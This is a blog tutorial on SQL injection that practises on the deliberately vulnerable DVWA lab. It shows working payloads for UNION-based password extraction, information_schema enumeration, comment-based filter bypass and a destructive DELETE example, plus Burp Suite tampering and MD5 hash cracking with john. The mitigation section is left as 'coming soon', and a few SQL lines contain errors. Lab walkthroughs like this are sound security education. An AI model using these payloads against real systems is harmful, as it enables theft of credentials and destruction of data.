---
layout: post
title: SQL Injection
excerpt: "If you look on top 10 of OWASP about Application Security Risks you may find the greatest vulnerabilities on Applications! <br>
The cool thing is that injection is the number one and it may sound weird but there is some website that using SQL (Structured Query Language) and you can attack these website in such type of attack that they really should not work anymore but still does. <br>
Let's look on the SQL injection in details."
tags:
- Injection

---
SQL or Structured Query Language is a way to store and pullout data from database and it's fairly easy because it's like English actually, you can write things like `SELECT * FROM thistable` and every such command will bring up to you results from the database and this was the way to store things in websites and still does for many years.

If we talking about injection you may know that inject some code is not related only to SQL, you can actually to do so with various programing language of course it depend on how the programmer developed that site, but if he or she not care enough about the little things in that code, we may find some way to inject some unwanted code to the website.

In that  article I would like to present and demonstrate the following in order for you have a full picture of what is going on here, so the main goal here is:
- [How SQL work.](#how-sql-work)
- [What is the vulnerability.](#what-is-the-vulnerability)
- [Exploit that vulnerability.](#exploit-that-vulnerability)
- [How to migrate that vulnerability.](#how-to-migrate-that-vulnerability)


### How SQL work

I think that before you five in to SQL you need basic understanding how it works, in this section I'm using Ubuntu server with mysql database, so first of all let's connect to our SQL database.

 To setup mysql in you Ubuntu server you can follow [this documentation](https://help.ubuntu.com/lts/serverguide/mysql.html) or you can just type:<br>
 ```
 sudo apt update
 sudo apt upgrade
 sudo apt install mysql-server
 sudo service mysql start
 sudo service mysql status
```


 The last command will show you what is the status of your sql service, if you have some issue related to that service please search the error you got in [stackoverflow](stackoverflow.com) it is a grate way to solve issues with the community.

 ![sql-injection-001.png](/assets/images/sql-injection-001.png)
 **Figure 1** MySQL server.

 After your sql server are ready to use just connect to the database, if it is you first time you should get aome alert about setup your password, just do the command `sudo mysql -u root -p`

 ![sql-injection-002.png](/assets/images/sql-injection-002.png)
 **Figure 2** Connect to the database.

 Now let's look on the command we have in SQL.<br>
 - `CREATE DATABASE database_name;` - create some database, in that database we will create tables that contain values of our users.<br>
 - `CREATE TABLE table_name;` - creating a table with columns and datatype.<br>
 - `DROP  DATABASE database_name;` - delete the database.<br>
 - `DELETE FROM table_name WHERE column_name=value;` - delete some value in our table base on the column_name name, please notice the `WHERE` statement, if you doesn't specified that WHERE it will delete every value in the table.<br>
 - `ALERT TABLE table_name DROP COLUMN column_name;` - this command will delete the column in the table that we specified.<br>
 - `SELECT * FROM table_name;` - this command will display every value from the table.<br>
 - `SELECT * FROM table_name ORDER BY column_name [ASC/DESC];` - this will display the data ordered by the method we chose, DESC stand for descending and ASC stand for ascending.<br>
 - `ALTER TABLE table_name ADD column_name datatype;` - to add some column to out table.<br>
 - `UPDATE table_name SET column_name = value WHERE column_name = value;` - set some value to some filed base on column_name value.<br>

##### SQL Operators:

| Operator        | Description        |
| ------------- |:---------|
| `=`	        | Equal to      |
| `<>`        | not equal to ( is the same as !=)       |
| `>`	        | Greater than|  
| `<`	        | Less than   |
| `#`         | Used for comment on that line (mean that alll character after '#' will be ignored)|
| `%`         | If we use `LIKE` it is used as wildcard character |
| `LIMIT`	    | Limit the query by number |
| `BETWEEN`   | Will give us a rang  |
| `LIKE`      | Matches a pattern  |
| `IS or IS NOT` | Compare to null  |

**Table 1** for more operator refer to [that link.](https://www.w3schools.com/sql/sql_operators.asp)

Let's create new database with table and filled that table with users ID and data.<br>

{% highlight mysql %}
CREATE DATABASE mysite;
USE mysite;
{% endhighlight %}

Please remember that you mush chose database before you create some table.

![sql-injection-003.png](/assets/images/sql-injection-003.png)
**Figure 3** Select database.

{% highlight mysql %}
CREATE TABLE users(
  id INT NOT NULL,
  nickName VARCHAR(255),
  firstName VARCHAR(255),
  lestName VARCHAR(255),
  email VARCHAR(255)
  );
{% endhighlight %}

![sql-injection-004.png](/assets/images/sql-injection-004.png)
**Figure 4** Create table.

So far we created database named "mysite" and add table named users, in that table we have users ID which is must be valuable (NOT NULL) and number (INT which is an integer), in the other values we specified that each value can be long up to 255 characters (VARCHAR(255)), now we need to filled that table up.

{% highlight mysql %}
INSERT INTO users(id, nickName, firstName, lestName, email) VALUES
(1, 'Jimi', 'Johnny', 'Hendrix', 'jhendrix@gmail.com'),
(2, 'Jenni', 'Jennifer', 'Batten', 'jbatten@gmail.com'),
(3, 'Steve', 'Steven', 'Vai', 'svai@gmail.com'),
(4, 'Jim', 'James', 'Morrison', 'jmorrison@gmail.com'),
(5, 'AliceCooper', 'Vincent', 'Furnier', 'vfurnier@gmail.com');
{% endhighlight %}

![sql-injection-005.png](/assets/images/sql-injection-005.png)
**Figure 5** Filled up the tables with values.

To display the all table, just type SELECT and asterisk FROM the table name.
![sql-injection-006.png](/assets/images/sql-injection-006.png)
**Figure 6** Tables with values.

Note that we can insert more that one command in the same raw.
![sql-injection-007.png](/assets/images/sql-injection-007.png)
**Figure 7** More than one command.

Now let's change some email in out table, just type as follow:
![sql-injection-008.png](/assets/images/sql-injection-008.png)
**Figure 8** Chenge email.

So if in some website used SQL to store some data in tables from the user, if some user change his email address, this is what actually append behind the scene.

We can also use some sentence that specified True of False to display something, in the next example I'm use 1=1 which mean True, this is why it display to me all of the values.
![sql-injection-009.png](/assets/images/sql-injection-009.png)
**Figure 9** 1=1 is actually True.

We have a way to use wildcard like the next example:<br>
`SELECT * FROM users WHERE lastName LIKE '%n';`
In that case the query give up the last names that end with `n` which can be helpful to filter stuff.

![sql-injection-010.png](/assets/images/sql-injection-010.png)
**Figure 10** 1=1 is actually True.


### What is the vulnerability

So in SQL the way it's works with website is as follow,  let's assume that we have some filed that ask us username and password, if we type in some value like `guy` and hit enter it will generate some command in SQL to the database like  `SELECT * FROM users WHERE USERNAME = 'guy';`, please note the quotation marks, in this way the database will bring back `"guy"`, the problem is with those quotation marks, it little bit tricky because let's say that the user actually put in that filed quotation marks, something that look like that:
`SELECT * FROM users WHERE USERNAME = 'guy''`

In that case it will failed because the command is not match up, and it will send some error, so it may be annoying, but if we think about that we can do some serious damage in that way because in SQL we have more command like `INSERT` to insert stuff or `UPDATE` to change stuff and `DELETE` to remove data from the database, so if we write on the username filed something more like:
 `guy"; DELETE * FROM table_name;`

The command will work and because it is a SQL it will delete everything that in the table_name.

The way to migrate this issue is called escaping and it's something like the programmer will setup in the code that every time we have quotation marks just put backslash before it, in that way the quotation marks in the filed will be handled as a character and not as quotation marks in the SQL so it may help to migrate the problem with command in SQL in the user input.

For that article I'm going to use DVWA which is great way to learn about vulnerability related to websites, the usual Linux Kali will be used to attack those websites and I hope you will enjoy it.
You can download DVWA from [here](http://www.dvwa.co.uk/), in this web you can find the source code which contain the REDAME.md file that can help you to install the DVWA on your operation system. We going to look on only the SQL injection in that article, I hope you enjoy it! I sure that I will!:]


There is a three type of SQL injection:
- Error base: we make some query to the database and we get some error from it, we can extract information about the server in that way.
- Union base: in that case we use more then one SELECT SQL query in the same statements and get some single result.
- Blind base: in that type of SQL injection we can do more than ask the database true of false question and using whether valid page returned or not, or we can use the time it took for the page to load, we will see how that going on in that article.


### Exploit that vulnerability.

Ok guys, I have done to setup my Ubuntu server with php7.0 and mysql database and the website (DVWA) is live and running. I have Kali Linux machine and from that machine we going to do the coolest stuff!
So my topology look something like that:

![sql-injection-011.png](/assets/images/sql-injection-011.png)
**Figure 11** Topology for our lab.

you can do the same I did if you like, if you have some trouble in the installation process please feel free to leave a comment here or send me an email and I'll be glad to help.

for this kind for lab you actually doesn't need to setup spacial server just for DVWA, you can setup is on you computer and trying to attack from your Kali, or you can attack the website from your computer, it's really doesn't matter, you can also setup the web directly on your Kali which is the best I think.

Ok, let's look on the DVWA website, we going to do every challenge in that web that related to SQL, so let's start from the low level security to high, if you configure everything correctly you should get the following page:
![sql-injection-012.png](/assets/images/sql-injection-012.png)
**Figure 12** Topology for our lab.

The default username is admin and password is password, after you login go to DVWA security tab and select low level and submit it.
![sql-injection-013.png](/assets/images/sql-injection-013.png)
**Figure 13** Topology for our lab.

After that go SQL injection tab, and here we going to do our magic!
As you can see the User ID box and submit button, you can trying to insert some value in that box but nothing will happened, only the URL will be change but it's irrelevant in that point. however if you type sum number in range of 1 to 5 you get some value from the database.

![sql-injection-014.png](/assets/images/sql-injection-014.png)
**Figure 14** Data from the database.

So we can see the users and their surenames, let's play with the box little more, just write a comma `'` sign and click on the submit button it will bring up an error.
![sql-injection-015.png](/assets/images/sql-injection-015.png)
**Figure 15** Data from the database.

So right now we know that the web server is vulnerable for Error base attack, so let's try to play with it more. every query are generate some sentence with quotation marks on the value that the user type, so, in the case we typed 1 in the SQL query it would be something like `SELECT column FROM table WHERE number='1'`, remember we type only 1 without quotation marks, so when we type `1'` it actually look like `number= '1''`, so if we trying to put some query we can put in the filed something like that:<br>
`1' or '0'='0` <br>
In that case the query will look something like that:<br>
`number = '1' or '0'='0'`<br>
In the query case it's put quotation marks,I'll bold it so you can see:<br>
number = **'** 1' or '0'='0 **'**<br>
In that case it look like we add another values to the SQL query and the 0=0 is sort of True query, so the answer we get will be all the values because the existing of the value is true, let's look how is works in the SQL, if we type that query we get the following:

![sql-injection-016.png](/assets/images/sql-injection-016.png)
**Figure 16** SQL query.

Now we extract all users from database because the True statement, every value is True so this is why we get every value from the table.

We can adding UNION to sql statement which mean that we use 2 SELECTED statement at once, so, we can write a brand new command in the input box and maybe the SQL will treat that statement as usual, please remember that if we use UNIUN, we can only use that in SELECT statement, and the SELECT statement must be query of equal column, as example the following:

{% highlight mysql %}
SELECT firstName, lastName, email LIKE '%te%' FROM users UNION SELECT firstName, lastName, email LIKE '%r%' FROM users;
{% endhighlight %}

In this statement we query the firstName and lastName from our mysite table and we display also the  who have email that contain 'te' in it, in the union we do the same but this time the query should display the rows from our table that contain 'r' in the email filed.

![sql-injection-017.png](/assets/images/sql-injection-017.png)
**Figure 17** SQL query with UNION.

Please note that we have a third column that contain `0` or `1`, which specified answer to our query. So if we go back to our Kali machine we can use UNION to display two SELECT at once, just inject the follow:
```
1' union select first_name,last_name from users WHERE user_id='2
```

And this is the SQL answer we get for that query:
![sql-injection-018.png](/assets/images/sql-injection-018.png)
**Figure 18** SQL query with UNION display two users.

Please note that I used `first_name` and `last_name` for my query, you may ask how did I now that the column names are like that? if you check that website you will see the View Source button and if you click on that you will see the php code that contain the query with `first_name` and `last_name`, but please remember that in the real world it doesn't likely you can view some php code of some site, normally the php code used as server side so you never been access to that code directly, you may try to extract that code with XSS or CSRF or any sort of attacks, but in some cases you may guess the query, just remember that the developer may used some common names, so it may be more simple to guess that column names than extract the code that contain the query.

![sql-injection-019.png](/assets/images/sql-injection-019.png)
**Figure 19** Source code.

I want you to new that there is more data that we can find about the database it self and it inportent to know that stuff so just follow me, you can make a SELECT query from the database for find boxes from the table without any value, so let's say that in our table there is some box without value, we can may query to find this boxes as follow:
{% highlight mysql %}
SELECT first_name FROM users WHERE the middle_name IS NULL;
{% endhighlight %}

In that case that query bring us any user that he have no middle name, so that is the main used for NULL, there is another way to use it, but before that there is more things you should know, there is a way to query some data about the database it self, there is some  [functions](https://www.w3schools.com/sql/sql_ref_mysql.asp) that used for check some values related to the database itself or mysql server we working on, as example what is the user we used for mysql, what is the version of mysql database, what is the name of the database we working on it and so on.

{% highlight mysql %}
USE mysite;
SELECT database();
{% endhighlight %}

In that case the database will show us his name after we chose the database, in my case the database name will be 'mysite'.

![sql-injection-024.png](/assets/images/sql-injection-024.png)
**Figure 24** Database function.

So let's think carefully, we have a way to extract data about the database, but if we use injection with `UNION` we must use in our case two SELECT query because the original query that the php code produces include two column, so if we do something like:

{% highlight mysql %}
select
  first_name,
  last_name
  FROM users WHERE user_id='1' or '0'='0'
  UNION
  SELECT database();
{% endhighlight %}

we will get an error.

![sql-injection-025.png](/assets/images/sql-injection-025.png)
**Figure 25** Erorr "different number of columns".

For that matter we need to use other query that contain `UNION SELECT` with two another columns, we can achieve that goal with NULL, to doing so just type the following:

{% highlight mysql %}
select
  first_name,
  last_name
  FROM users WHERE user_id='1' or '0'='0'
  UNION
  SELECT NULL, database();
{% endhighlight %}

So, we can use sort of function query to extract more data about the database and it's important that you new them all or most of them:
{% highlight mysql %}
SELECT NULL, database();
SELECT NULL, user();
SELECT NULL, version();
{% endhighlight %}

![sql-injection-026.png](/assets/images/sql-injection-026.png)
**Figure 26** Select null with function.

Now we know lets do some injection.
![sql-injection-027.png](/assets/images/sql-injection-027.png)
**Figure 27** database() - for seen the database name.


![sql-injection-028.png](/assets/images/sql-injection-028.png)
**Figure 28** version() - for seen the version of our sql database.

![sql-injection-029.png](/assets/images/sql-injection-029.png)
**Figure 29** user() - for seen the user that used fro connection the sql server.

we will use in these commands a lot in this article, it is very important to know such information because let's say in some mysql version you can do more stuff that in older version you can't do, as example the command `ROW_NUMBER()` can be use in mysql version 8.0.2, but not in version 5.5. You can view in detail the [mysqld-version-reference.](https://dev.mysql.com/doc/mysqld-version-reference/en/mysqld-version-reference-opsfuncs.html)

Now let's do the same with SELECT sentence that contain some query for password, the query I need to accomplish should look as follow:
```
SELECT first_name, last_name FROM users WHERE user_id = '1' union SELECT first_name, password FROM users WHERE user_id='1';
```

So the injection code look like that:

```
1' union SELECT first_name, password FROM users WHERE user_id='1
```

![sql-injection-020.png](/assets/images/sql-injection-020.png)
**Figure 20** Extract some password.

Well guys, did you saw that? the password is in the surname filed! it look like sort of hash so we need some tool that can find for us the real value of that hash. There is many hash crack out there, just for reminder, hash is some data that some cryptographic function was run on it and produces output of  160-bit value, please note that this is difference from encryption method, in hashing method you can't extract the original data value from the hashing value because it is [one-way function](https://en.wikipedia.org/wiki/One-way_function), so the way to find some hashing of some value is to take some data and run the hash function on it and compare the output to the hashing value you wanted to, and if there is a match you now know what is the original value.

In our case I guess the hash value is md5 type so we can check in our linux machineand find a match, just type the command as follow:
{% highlight shell %}
echo -n password | md5sum
{% endhighlight %}

![sql-injection-021.png](/assets/images/sql-injection-021.png)
**Figure 21** Hash value.

Now if you compare the output to the hash value we already have from our database, this is the same value! which mean that the password is actually "password". If you want to use some online database of crack hashing you can used this links:
[crackstation](https://crackstation.net/)
[hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx)
[onlinehashcrack](https://www.onlinehashcrack.com/)
I am using them a lot and they very helpful.

So, from that output we know that admin password is 'password'... so typical lol :P

let's try to extract other password from the database, just inject the follow:
{% highlight mysql %}
1' union SELECT first_name, password FROM users WHERE user_id='1' or '0'='0
{% endhighlight %}

And that is it, all we need now is find out what is the real value for that hashs.

![sql-injection-022.png](/assets/images/sql-injection-022.png)
**Figure 22** Hashs passwords.

Let's crack all password with john the ripper, just take the data and past it in some text editor with the following structure:
```
usename:hachPassword
```

I saved the data in text.txt file, then type the following command in your terminal:
```
john --format=raw-MD5 text.txt
```

![sql-injection-023.png](/assets/images/sql-injection-023.png)
**Figure 23** john the ripper.

Please note that so far we used Union base to find the data we needed, we will implement more injection types in this article, just bear with me for a moment.

Now let's go to the higher level, change the security level to medium and go back to SQL Injection page, ![sql-injection-030.png](/assets/images/sql-injection-030.png)
**Figure 30** Security level medium.

Now in the SQL Injection you see that there is no user input, we have some selected box and now we can only select from 1 to 5 and see the user username and surname, so you may ask what we can do now? there no way to inject some query value in that case. You may right but not so quite, there is no input box for the user that true, but now we need some way to make query from the browser and change that query before it will sending to the server, to do so I am going to use burpsuite tool. In that tool we can use local proxy to transfer all our data through burpsuite and then we can change the query before it go to the server.

Before we use burpsuite we need to set our browser to use proxy which will be the burpsuite, just go to the menu in your browser and click on preferences.

![sql-injection-031.png](/assets/images/sql-injection-031.png)
**Figure 31** Security level medium.

Or press F12 on your key board and go to advance>network>setting.
![sql-injection-032.png](/assets/images/sql-injection-032.png)
**Figure 32** Security level medium.

Then change to Menual proxy configuration with http proxy of 127.0.0.1 which is localhost and port 8080.
![sql-injection-033.png](/assets/images/sql-injection-033.png)
**Figure 33** Security level medium.

On linux Kali the burpsuite is buildin so just click on the burpsuite icon in the bar slide and then go to proxy>intercept and click on "Intercept is off" button, by pressing that it will change to "Intercept is on", now in the SQL Injection page if we press on submit button we will see in row tab of burpsuite the data that going to be send and all we need to do next is to change it!

![sql-injection-034.png](/assets/images/sql-injection-034.png)
**Figure 34** Security level medium.

Now let's use the Error base technique, we know that we have some query and we don't need to new the database name, but we need to know the number of column in the original query because we want to use UNION and in that case we must to use equal column number for our injected query, for doing so we can use the command ORDER BY column number. ORDER BY used for ordering the value inside the columns, so if we type ORDER BY 1 it will order our request by column 1 in alpha beta form, and if we type ORDER BY 2 it will order our column number 2.

![sql-injection-035.png](/assets/images/sql-injection-035.png)
**Figure 35** ORDER BY example.

In case we type some number that not match the columns we will get some error, so in my case if I type ORDER BY 6 it will bring me an error because I haven't column 6.

![sql-injection-036.png](/assets/images/sql-injection-036.png)
**Figure 36** ORDER BY error.

So, let's try that up in on our target, just type the injection query in the burpsuite as follow and press on forward:
{% highlight mysql %}
1 ORDER BY 1
{% endhighlight %}

![sql-injection-037.png](/assets/images/sql-injection-037.png)
**Figure 37** ORDER BY 1.

We have no error so let's try:
{% highlight mysql %}
1 ORDER BY 3
{% endhighlight %}

![sql-injection-038.png](/assets/images/sql-injection-038.png)
**Figure 38** ORDER BY error.

Cool! we have some error, so this is mean that we have no column 3 in the table, now let's try check column 2, it more likely that it will work.

![sql-injection-039.png](/assets/images/sql-injection-039.png)
**Figure 39** ORDER BY 2.

It work! so now we know that we have 2 column in that table so if we using UNION we need to select two columns in our query, but we still need more data like the columns name and tables name, we can guess it but there is a way to extract that out, for doing so we going to use [information_schema.](https://dev.mysql.com/doc/refman/5.7/en/information-schema.html), this is the way  to provide access to the database metadata so we can make some query about the columns name with that option, just type as follow:

{% highlight mysql %}
1 UNION SELECT null, column_name FROM information_schema.columns
{% endhighlight %}

![sql-injection-040.png](/assets/images/sql-injection-040.png)
**Figure 40** information_schema.columns.

So now we have the name of all the column name from all database that exist in that sql server, and if we scroll down little bit we will find some value that look like what we search so far.

![sql-injection-041.png](/assets/images/sql-injection-041.png)
**Figure 41** Column values name.

New let's check the tables name with information_schema.tables
{% highlight mysql %}
1 UNION SELECT null, table_name FROM information_schema.tables
{% endhighlight %}
![sql-injection-042.png](/assets/images/sql-injection-042.png)
**Figure 42** tables name.

So the users table is what we looking for. Now we can accomplish the command we want in the first place, now inject the following:
{% highlight mysql %}
1 UNION SELECT first_name, password FROM users
{% endhighlight %}

![sql-injection-043.png](/assets/images/sql-injection-043.png)
**Figure 43** users and password.

We did it again guys!!! we won!!! or more likely we own the database!!!! GAME OVER!
![sql-injection-044.png](/assets/images/sql-injection-044.png)
**Figure 44** GAME OVER.

Let's go to the next level! but before that I want you to solve by yourself the the High Level, this time you have all of the knowledge you need to do so, after you finish please step foreword and see how I solved that level, if your solution is different then my, please let me know:) or comment down below.

After you change the level on "DVWA Security" to High Level, you can see that in SQL Injection page, now you have some link that open new window for you type in the ID you want, and if we typed the injection like we done so far it doesn't work for us:

![sql-injection-045.png](/assets/images/sql-injection-045.png)
**Figure 45** The injection doesn't work.

So as you can see we expected to see every user in the table but unfortunately we got 1 error line that not look like sql error, and now if we type some other query that should bring up an error, this is not work as well:
![sql-injection-046.png](/assets/images/sql-injection-046.png)
**Figure 46** No sql error.

As you can see I just add a single quote "**'**" to the query and I got "something went wrong" that mean we have no errors in that level like we saw in other levels.

Again, we need first of all the table name and the column number but we have no way to inject our SQL code and we get no error so let's think what we can do, if you remember in the beginning of that article we saw some of the [SQL operators](#sql-operators) that we can used in our query, and we have "Hash" sign that used for commit in our query like in other programing language so let's see how that go.

![sql-injection-047.png](/assets/images/sql-injection-047.png)
**Figure 47** Query with Hash sign.

So now we know that there is something that deny for us every query, I want you just look in the source code to see how they apply that.

![sql-injection-048.png](/assets/images/sql-injection-048.png)
**Figure 48** Limit in query with Hash sign.

Ok, we know now that the query limit for one query only and the error come from the php code, so keep that in mind that this one way to migrate the injection, but as you saw he have way to make the injection anyway with the Hash sign because in SQL this is treat as comment on the query line so this is why the limit to 1 are ignored.

So now let's inject the usual injection codes. I am going to apply that injection like I have no clue how the original php code look like.
{% highlight mysql %}
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#
1' UNION SELECT null, table_name FROM information_schema.tables#
1' UNION SELECT null, column_name FROM information_schema.columns#
1' UNION SELECT first_name, password FROM users#
{% endhighlight %}

From the first two line we will see that everything work normal but not in the third line, so this is mean that we use only 2 columns, so now I am checking the table name and the columns names that exist in that database, in the last query I am using the columns name on users table in my query and that's it, we have what we need!

![sql-injection-049.png](/assets/images/sql-injection-049.png)
**Figure 49** Injection are working with `#` sign.

Please remember that it still Error base, maybe you can called it Blind base but I doesn't because we have some of error in that level, yeh sure this is not a SQL error, but still we have a way to see here we inject some miss type SQL query.

Now let's go for the "Impossible" level and see how that is going on. Again, I recommend to try that level by yourself, I admit that is difficult one, but maybe you have the knowledge to solve it by yourself and if not you can try anyway and lean through Google more and maybe you will find the answer. After you finish check out what I've done this time, and again, if you find different solution please let me know or leave a commit down below.

Ok, everybody like tools, so this is time to lean some tools. It is very important for you to know how to used that tools if you going to check injection vulnerabilities on some website, in this level we face with blind base, if you try to insert something simple like `1` you will see that it's work fine but if you try to insert something that should cause some error like `1'`, your error will never showed up because the php code prevent from us to get the error value, so if he have some error he will never send it to us, just remember that the code that I am talking about is server side code like we saw earlier in this article, and we would never get an access to server side codes, so just keep that in mind, in our case we can view the source code.

![sql-injection-050.png](/assets/images/sql-injection-050.png)
**Figure 50** Have no error.

So in the source code you can see that we have some `if` statement that treat ID only if it equal to numeric value, but we have no `else` statement that treat ID if it doesn't equal to some number so this is blind base.

![sql-injection-051.png](/assets/images/sql-injection-051.png)
**Figure 51** Blind base.

To work around that case we going to use sqlmap, first of all I want you to read about [sqlmap]()

### How to migrate that vulnerability.
**coming soon**


### Videos in Hebrew about SQL injection:

<iframe width="560" height="315" src="https://www.youtube.com/embed/wb0RaqskD5s" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
